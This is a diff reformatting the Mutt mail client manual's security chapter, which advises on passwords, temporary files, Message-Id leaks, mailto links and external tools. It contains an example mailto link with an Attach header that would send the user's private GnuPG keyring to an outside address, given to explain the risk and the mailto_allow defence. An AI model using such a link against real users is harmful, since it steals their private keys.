@@ -2,68 +2,158 @@
 layout: manual
 title: Security Considerations
 ---
-    <div class="chapter"><div class="titlepage"><div><div><h1 class="title"><a class="offset" id="security"></a>Chapter 7. Security Considerations</h1></div></div></div><div class="toc"><p><strong>Table of Contents</strong></p><dl class="toc"><dt><span class="sect1"><a href="security.html#security-passwords">1. Passwords</a></span></dt><dt><span class="sect1"><a href="security.html#security-tempfiles">2. Temporary Files</a></span></dt><dt><span class="sect1"><a href="security.html#security-leaks">3. Information Leaks</a></span></dt><dd><dl><dt><span class="sect2"><a href="security.html#security-leaks-mid">3.1. Message-Id: headers</a></span></dt><dt><span class="sect2"><a href="security.html#security-leaks-mailto">3.2. <code class="literal">mailto:</code>-style Links</a></span></dt></dl></dd><dt><span class="sect1"><a href="security.html#security-external">4. External Applications</a></span></dt></dl></div><p>
-First of all, Mutt contains no security holes included by intention but
 {% raw %}
-may contain unknown security holes. As a consequence, please run Mutt
-only with as few permissions as possible. Especially, do not run Mutt as
-the super user.
-</p><p>
-When configuring Mutt, there're some points to note about secure setups
-so please read this chapter carefully.
-</p><div class="sect1"><div class="titlepage"><div><div><h2 class="title" style="clear: both"><a class="offset" id="security-passwords"></a>1. Passwords</h2></div></div></div><p>
-Although Mutt can be told the various passwords for accounts, please
-never store passwords in configuration files. Besides the fact that the
-system's operator can always read them, you could forget to mask it out
-when reporting a bug or asking for help via a mailing list. Even worse,
-your mail including your password could be archived by internet search
-engines, mail-to-news gateways etc. It may already be too late before
-you notice your mistake.
-</p></div><div class="sect1"><div class="titlepage"><div><div><h2 class="title" style="clear: both"><a class="offset" id="security-tempfiles"></a>2. Temporary Files</h2></div></div></div><p>
-Mutt uses many temporary files for viewing messages, verifying digital
-signatures, etc. As long as being used, these files are visible by other
-users and maybe even readable in case of misconfiguration.  Also, a
-different location for these files may be desired which can be changed
-via the <a class="link" href="reference.html#tmpdir" title="3.303. tmpdir">$tmpdir</a> variable.
-</p></div><div class="sect1"><div class="titlepage"><div><div><h2 class="title" style="clear: both"><a class="offset" id="security-leaks"></a>3. Information Leaks</h2></div></div></div><div class="sect2"><div class="titlepage"><div><div><h3 class="title"><a class="offset" id="security-leaks-mid"></a>3.1. Message-Id: headers</h3></div></div></div><p>
-Message-Id: headers contain a local part that is to be created in a
-unique fashion. In order to do so, Mutt will <span class="quote">“<span class="quote">leak</span>”</span> some
-information to the outside world when sending messages: the generation
-of this header includes a step counter which is increased (and rotated)
-with every message sent. In a longer running mutt session, others can
-make assumptions about your mailing habits depending on the number of
-messages sent. If this is not desired, the header can be manually
-provided using <a class="link" href="reference.html#edit-headers" title="3.59. edit_headers">$edit_headers</a> (though
-not recommended).
-</p></div><div class="sect2"><div class="titlepage"><div><div><h3 class="title"><a class="offset" id="security-leaks-mailto"></a>3.2. <code class="literal">mailto:</code>-style Links</h3></div></div></div><p>
-As Mutt be can be set up to be the mail client to handle
-<code class="literal">mailto:</code> style links in websites, there're security
-considerations, too. Arbitrary header fields can be embedded in these
-links which could override existing header fields or attach arbitrary
-files using <a class="link" href="gettingstarted.html#attach-header" title="6.2.2. Attach: Pseudo Header">the Attach:
-pseudoheader</a>. This may be problematic if the <a class="link" href="reference.html#edit-headers" title="3.59. edit_headers">$edit-headers</a> variable is
-<span class="emphasis"><em>unset</em></span>, i.e. the user doesn't want to see header
-fields while editing the message and doesn't pay enough attention to the
-compose menu's listing of attachments.
-</p><p>
-For example, following a link like
-</p><pre class="screen">
-mailto:joe@host?Attach=~/.gnupg/secring.gpg</pre><p>
-will send out the user's private gnupg keyring to
-<code class="literal">joe@host</code> if the user doesn't follow the information
-on screen carefully enough.
-</p></div></div><div class="sect1"><div class="titlepage"><div><div><h2 class="title" style="clear: both"><a class="offset" id="security-external"></a>4. External Applications</h2></div></div></div><p>
-Mutt in many places has to rely on external applications or for
-convenience supports mechanisms involving external applications.
-</p><p>
-One of these is the <code class="literal">mailcap</code> mechanism as defined by
-RfC1524. Details about a secure use of the mailcap mechanisms is given
-in <a class="xref" href="mimesupport.html#secure-mailcap" title="3.2. Secure Use of Mailcap">Section 3.2, “Secure Use of Mailcap”</a>.
-</p><p>
-Besides the mailcap mechanism, Mutt uses a number of other external
-utilities for operation, for example to provide crypto support, in
-backtick expansion in configuration files or format string filters.  The
-same security considerations apply for these as for tools involved via
-mailcap.
-</p></div></div><div class="navfooter"><hr /><table width="100%" summary="Navigation footer"><tr><td width="40%" align="left"><a accesskey="p" href="optionalfeatures.html">Prev</a> </td><td width="20%" align="center"> </td><td width="40%" align="right"> <a accesskey="n" href="tuning.html">Next</a></td></tr><tr><td width="40%" align="left" valign="top">Chapter 6. Optional Features </td><td width="20%" align="center"><a accesskey="h" href="index.html">Home</a></td><td width="40%" align="right" valign="top"> Chapter 8. Performance Tuning</td></tr></table></div>
+<div class="chapter">
+  <div class="titlepage">
+    <div>
+      <div>
+        <h1 class="title">
+        <a class="offset" id="security"></a>Chapter&#160;7.&#160;Security Considerations</h1>
+      </div>
+    </div>
+  </div>
+  <div class="toc">
+    <p>
+      <strong>Table of Contents</strong>
+    </p>
+    <dl class="toc">
+      <dt>
+        <span class="sect1">
+          <a href="security.html#security-passwords">1. Passwords</a>
+        </span>
+      </dt>
+      <dt>
+        <span class="sect1">
+          <a href="security.html#security-tempfiles">2. Temporary Files</a>
+        </span>
+      </dt>
+      <dt>
+        <span class="sect1">
+          <a href="security.html#security-leaks">3. Information Leaks</a>
+        </span>
+      </dt>
+      <dd>
+        <dl>
+          <dt>
+            <span class="sect2">
+              <a href="security.html#security-leaks-mid">3.1. Message-Id: headers</a>
+            </span>
+          </dt>
+          <dt>
+            <span class="sect2">
+              <a href="security.html#security-leaks-mailto">3.2. 
+              <code class="literal">mailto:</code>-style Links</a>
+            </span>
+          </dt>
+        </dl>
+      </dd>
+      <dt>
+        <span class="sect1">
+          <a href="security.html#security-external">4. External Applications</a>
+        </span>
+      </dt>
+    </dl>
+  </div>
+  <p>First of all, Mutt contains no security holes included by intention but may contain unknown security holes. As a consequence, please run Mutt only with as few permissions as possible. Especially, do not run Mutt as the super user.</p>
+  <p>When configuring Mutt, there're some points to note about secure setups so please read this chapter carefully.</p>
+  <div class="sect1">
+    <div class="titlepage">
+      <div>
+        <div>
+          <h2 class="title" style="clear: both">
+          <a class="offset" id="security-passwords"></a>1.&#160;Passwords</h2>
+        </div>
+      </div>
+    </div>
+    <p>Although Mutt can be told the various passwords for accounts, please never store passwords in configuration files. Besides the fact that the system's operator can always read them, you could forget to mask it out when reporting a bug or asking for help via a mailing list. Even worse, your mail including your password could be archived by internet search engines, mail-to-news gateways etc. It may already be too late before you notice your mistake.</p>
+  </div>
+  <div class="sect1">
+    <div class="titlepage">
+      <div>
+        <div>
+          <h2 class="title" style="clear: both">
+          <a class="offset" id="security-tempfiles"></a>2.&#160;Temporary Files</h2>
+        </div>
+      </div>
+    </div>
+    <p>Mutt uses many temporary files for viewing messages, verifying digital signatures, etc. As long as being used, these files are visible by other users and maybe even readable in case of misconfiguration. Also, a different location for these files may be desired which can be changed via the 
+    <a class="link" href="reference.html#tmpdir" title="3.310.&#160;tmpdir">$tmpdir</a>variable.</p>
+  </div>
+  <div class="sect1">
+    <div class="titlepage">
+      <div>
+        <div>
+          <h2 class="title" style="clear: both">
+          <a class="offset" id="security-leaks"></a>3.&#160;Information Leaks</h2>
+        </div>
+      </div>
+    </div>
+    <div class="sect2">
+      <div class="titlepage">
+        <div>
+          <div>
+            <h3 class="title">
+            <a class="offset" id="security-leaks-mid"></a>3.1.&#160;Message-Id: headers</h3>
+          </div>
+        </div>
+      </div>
+      <p>Message-Id: headers contain a local part that is to be created in a unique fashion. In order to do so, Mutt will 
+      <span class="quote">“
+      <span class="quote">leak</span>”</span>some information to the outside world when sending messages: the generation of this header includes a step counter which is increased (and rotated) with every message sent. In a longer running mutt session, others can make assumptions about your mailing habits depending on the number of messages sent. If this is not desired, the header can be manually provided using 
+      <a class="link" href="reference.html#edit-headers" title="3.59.&#160;edit_headers">$edit_headers</a>(though not recommended).</p>
+    </div>
+    <div class="sect2">
+      <div class="titlepage">
+        <div>
+          <div>
+            <h3 class="title">
+            <a class="offset" id="security-leaks-mailto"></a>3.2.&#160;
+            <code class="literal">mailto:</code>-style Links</h3>
+          </div>
+        </div>
+      </div>
+      <p>As Mutt be can be set up to be the mail client to handle 
+      <code class="literal">mailto:</code>style links in websites, there're security considerations, too. Arbitrary header fields can be embedded in these links which could override existing header fields or attach arbitrary files using 
+      <a class="link" href="gettingstarted.html#attach-header" title="6.2.2.&#160;Attach: Pseudo Header">the Attach: pseudoheader</a>. This may be problematic if the 
+      <a class="link" href="reference.html#edit-headers" title="3.59.&#160;edit_headers">$edit-headers</a>variable is 
+      <span class="emphasis">
+        <em>unset</em>
+      </span>, i.e. the user doesn't want to see header fields while editing the message and doesn't pay enough attention to the compose menu's listing of attachments.</p>
+      <p>For example, following a link like</p>
+      <pre class="screen">
+mailto:joe@host?Attach=~/.gnupg/secring.gpg
+</pre>
+      <p>will send out the user's private gnupg keyring to 
+      <code class="literal">joe@host</code>if the user doesn't follow the information on screen carefully enough.</p>
+      <p>To prevent these issues, Mutt by default only accepts the 
+      <code class="literal">Subject</code>and 
+      <code class="literal">Body</code>headers. Allowed headers can be adjusted with the 
+      <a class="link" href="configuration.html#mailto-allow" title="30.&#160;Control allowed header fields in a mailto: URL">
+        <span class="command">
+          <strong>mailto_allow</strong>
+        </span>
+      </a>and 
+      <a class="link" href="configuration.html#mailto-allow" title="30.&#160;Control allowed header fields in a mailto: URL">
+        <span class="command">
+          <strong>unmailto_allow</strong>
+        </span>
+      </a>commands.</p>
+    </div>
+  </div>
+  <div class="sect1">
+    <div class="titlepage">
+      <div>
+        <div>
+          <h2 class="title" style="clear: both">
+          <a class="offset" id="security-external"></a>4.&#160;External Applications</h2>
+        </div>
+      </div>
+    </div>
+    <p>Mutt in many places has to rely on external applications or for convenience supports mechanisms involving external applications.</p>
+    <p>One of these is the 
+    <code class="literal">mailcap</code>mechanism as defined by RfC1524. Details about a secure use of the mailcap mechanisms is given in 
+    <a class="xref" href="mimesupport.html#secure-mailcap" title="3.2.&#160;Secure Use of Mailcap">Section&#160;3.2, “Secure Use of Mailcap”</a>.</p>
+    <p>Besides the mailcap mechanism, Mutt uses a number of other external utilities for operation, for example to provide crypto support, in backtick expansion in configuration files or format string filters. The same security considerations apply for these as for tools involved via mailcap.</p>
+  </div>
+</div>
 {% endraw %}
